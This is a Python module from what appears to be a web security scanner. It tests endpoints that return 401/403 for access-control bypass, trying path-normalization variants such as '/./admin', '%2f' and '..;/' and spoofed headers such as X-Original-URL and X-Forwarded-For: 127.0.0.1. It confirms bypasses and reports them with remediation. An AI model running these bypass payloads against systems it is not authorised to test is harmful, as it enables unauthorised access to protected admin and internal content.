"""
AuthBypassModule — 401/403 access-control bypass via path normalization and
header overrides.

Reverse proxies, WAFs, and gateways frequently enforce access control on the
*raw* request path or trust a client-supplied header, while the origin
normalizes the path differently or honours that header as an authorization
override. The result: `/admin` is forbidden, but `/./admin`, `/admin%2f`,
`/admin..;/`, or a request carrying `X-Original-URL: /admin` /
`X-Forwarded-For: 127.0.0.1` sails straight through to the protected content.

Near-zero-false-positive discipline: the module reports a bypass ONLY when

  * the clean path genuinely returns 401/403, and
  * a variant returns 200 whose body is STRUCTURALLY DIFFERENT from the
    forbidden page, is not a soft-404/SPA catch-all, and carries materially
    more content (real protected material, not a prettier error), and
  * the 200 reproduces on a second request.

A server that simply answers 200 for everything never trips it, because the
variant body would be structurally identical to (or as empty as) the control.
"""
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None

from recon.core.validator import Validator
from recon.modules import BaseModule
from recon.core import cancellation

SENSITIVE_HINTS = [
    "admin", "manage", "internal", "private", "dashboard", "config", "setting",
    "console", "debug", "actuator", "metrics", "api/admin", "staff", "backend",
    "superuser", "root", "control", "cp", "wp-admin", "phpmyadmin",
]


def _path_variants(path: str):
    """Path-normalization bypass variants for a forbidden path."""
    p = path if path.startswith("/") else "/" + path
    seg = p.rstrip("/")
    name = seg.rsplit("/", 1)[-1]
    base = seg[: len(seg) - len(name)]  # includes trailing slash
    out = [
        f"{seg}/", f"{seg}/.", f"{base}./{name}", f"{base}.//{name}",
        f"{seg}%2f", f"{seg}/..;/", f"{seg}..;/", f"{seg};/", f"{seg}%20",
        f"{seg}%09", f"{seg}.json", f"{seg}/..%2f{name}", f"{base}{name}/./",
        f"/{name}" if base not in ("/", "") else None,
        f"{seg.upper()}" if seg.lower() != seg.upper() and name.isalpha() else None,
    ]
    seen, variants = set(), []
    for v in out:
        if v and v != p and v not in seen:
            seen.add(v)
            variants.append(v)
    return variants


# header -> value, each a distinct access-control override trick.
HEADER_TRICKS = [
    ("X-Original-URL", "__PATH__"), ("X-Rewrite-URL", "__PATH__"),
    ("X-Override-URL", "__PATH__"),
    ("X-Forwarded-For", "127.0.0.1"), ("X-Forwarded-Host", "localhost"),
    ("X-Originating-IP", "127.0.0.1"), ("X-Remote-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"), ("X-Real-IP", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"), ("X-Forwarded-Server", "localhost"),
    ("Referer", "__BASE__"),
]


class AuthBypassModule(BaseModule):
    NAME = "Access Control Bypass"
    MODULE_ID = "auth_bypass"
    MODULE_LABEL = "401/403 Access-Control Bypass"

    MAX_FORBIDDEN = 15

    def __init__(self, target, db, ui, context, timeout=10, delay=0.3,
                 threads=8, verbose=False, ai=None, output_dir=None):
        super().__init__(target, db, ui, context, timeout, delay, threads, verbose, ai, output_dir)
        self.session = self._session()
        self.validator = Validator(baseline=self.ctx.get("baseline_profile"), ai=self.ai, ui=self.ui)
        self._found = 0

    def run(self):
        self.ui.section("Access-Control Bypass — 401/403 Path & Header Overrides")
        if not requests:
            return
        forbidden = self._find_forbidden()
        if not forbidden:
            self.ui.info("No 401/403-protected endpoints discovered to test for bypass — skipping.")
            return
        self.ui.info(f"Found {len(forbidden)} forbidden endpoint(s); probing normalization + header bypasses.")

        for url, ctrl in forbidden:
            if cancellation.is_cancelled():
                break
            try:
                self._test(url, ctrl)
            except Exception as e:
                if self.verbose:
                    self.ui.error(f"auth-bypass error on {url}: {e}")

        if self._found == 0:
            self.ui.info("No access-control bypass confirmed.")
        else:
            self.ui.ok(f"Access-control bypass scan complete — {self._found} confirmed finding(s).")

    def _get(self, url, headers=None):
        try:
            self._throttle()
            return self.session.get(url, timeout=self.timeout, allow_redirects=False,
                                    headers=headers or {})
        except RequestException:
            return None

    def _find_forbidden(self):
        """Collect endpoints whose clean GET returns 401/403. Prioritizes
        sensitive-looking paths, then adds any other forbidden endpoints."""
        candidates, seen = [], set()
        pool = [self.base_url + "/" + h for h in SENSITIVE_HINTS]
        pool += [e for e in self.ctx.get("endpoints", [])]

        def consider(url):
            key = url.split("?", 1)[0].split("#", 1)[0]
            if key in seen or len(candidates) >= self.MAX_FORBIDDEN:
                return
            seen.add(key)
            r = self._get(url)
            if r is not None and r.status_code in (401, 403):
                candidates.append((url, {"status": r.status_code,
                                         "hash": self.validator._structural_hash(r.text or ""),
                                         "len": len(r.text or "")}))

        # Sensitive first (more likely to actually be protected), then others.
        sensitive = [u for u in pool if any(h in u.lower() for h in SENSITIVE_HINTS)]
        others = [u for u in pool if u not in sensitive]
        with ThreadPoolExecutor(max_workers=max(1, min(self.threads, 8))) as ex:
            list(ex.map(consider, sensitive))
            if len(candidates) < self.MAX_FORBIDDEN:
                list(ex.map(consider, others))
        return candidates

    def _looks_protected_content(self, resp, ctrl) -> bool:
        """A 200 that represents real protected content, not a disguised error
        / SPA shell / soft-404."""
        if resp is None or resp.status_code != 200:
            return False
        body = resp.text or ""
        if self.validator.is_soft_404(body, resp.status_code):
            return False
        h = self.validator._structural_hash(body)
        if h == ctrl["hash"]:
            return False  # same page as the 403 — not a real bypass
        # Require materially more content than the forbidden page (and a
        # non-trivial body) so an empty/near-empty 200 can't trip it.
        return len(body) > max(ctrl["len"] + 100, 200)

    def _test(self, url, ctrl):
        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        origin = f"{parsed.scheme}://{parsed.netloc}"

        # 1) Path-normalization variants.
        for vpath in _path_variants(path):
            if cancellation.is_cancelled():
                return
            vurl = origin + vpath
            if parsed.query:
                vurl += "?" + parsed.query
            r = self._get(vurl)
            if self._looks_protected_content(r, ctrl):
                confirm = self._get(vurl)
                if self._looks_protected_content(confirm, ctrl):
                    self._report(url, f"path normalization → {vpath}", r, ctrl,
                                 evidence_extra=[f"Bypass URL: {vurl}"])
                    return

        # 2) Header-override tricks.
        for hname, hval in HEADER_TRICKS:
            if cancellation.is_cancelled():
                return
            value = hval.replace("__PATH__", path).replace("__BASE__", origin + path)
            r = self._get(url, headers={hname: value})
            if self._looks_protected_content(r, ctrl):
                confirm = self._get(url, headers={hname: value})
                if self._looks_protected_content(confirm, ctrl):
                    self._report(url, f"header override → {hname}: {value}", r, ctrl,
                                 evidence_extra=[f"Header: {hname}: {value}"])
                    return

    def _report(self, url, technique, resp, ctrl, evidence_extra=None):
        added = self.db.add(
            title=f"Access-Control Bypass ({technique.split(' →')[0]}) on protected endpoint",
            severity="high", url=url, module=self.NAME,
            description=(
                f"{url} returns {ctrl['status']} (forbidden) to a normal request, but access control "
                f"is bypassed via {technique}: the bypass returned HTTP 200 with content that is "
                "structurally different from the forbidden page, is not a soft-404/catch-all, and "
                "carries real protected material (reproduced on a second request). A front-end proxy "
                "or WAF is enforcing authorization on a path/representation that differs from what the "
                "origin actually serves."
            ),
            remediation=(
                "Enforce authorization at the origin/application layer, not only at a front proxy; "
                "normalize the request path (collapse ./, //, %2e, %2f, trailing ;/ and dot-segments) "
                "identically everywhere access decisions are made; and never treat client-supplied "
                "headers (X-Original-URL, X-Rewrite-URL, X-Forwarded-For, X-Custom-IP-Authorization) "
                "as authorization inputs."
            ),
            cvss="8.2", confidence="CONFIRMED", confidence_score=92,
            validation_steps=["clean_path_forbidden", "variant_returned_distinct_200_content",
                              "not_soft_404", "reproduced"],
            evidence=[f"Clean status: {ctrl['status']}", f"Technique: {technique}",
                      f"Bypass status: 200", f"Forbidden-page len: {ctrl['len']} → bypass len: {len(resp.text or '')}"]
                     + (evidence_extra or []),
            references=[
                "https://portswigger.net/web-security/access-control",
                "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            ],
        )
        if added:
            self._found += 1
            self.ui.find("high", f"403 bypass via {technique.split(' →')[0]}", url)
            self.ui.bullet(technique, indent=12)
            self.ctx.setdefault("auth_bypass_findings", []).append({"url": url, "technique": technique})
